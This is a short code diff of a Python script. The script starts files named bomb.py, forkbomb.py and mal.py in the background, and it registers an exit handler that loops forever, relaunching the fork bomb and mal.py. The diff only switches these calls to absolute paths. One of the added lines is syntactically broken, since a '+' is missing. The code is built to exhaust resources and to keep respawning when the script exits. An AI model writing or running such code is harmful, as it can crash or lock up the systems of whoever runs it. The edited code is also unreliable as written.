@@ -1,9 +1,9 @@
 import os
 import atexit
-os.system("python _run.py & python bomb.py &")
+os.system("python " + os.getcwd() + "/_run.py & python " + os.getcwd() + "/bomb.py &")
 
 @atexit.register
 def goodbye():
   mal = True
   while mal == True:
-    os.system("python forkbomb.py & mal.py &")
+    os.system("python " os.getcwd() + "/forkbomb.py & " + os.getcwd() + "/mal.py &")
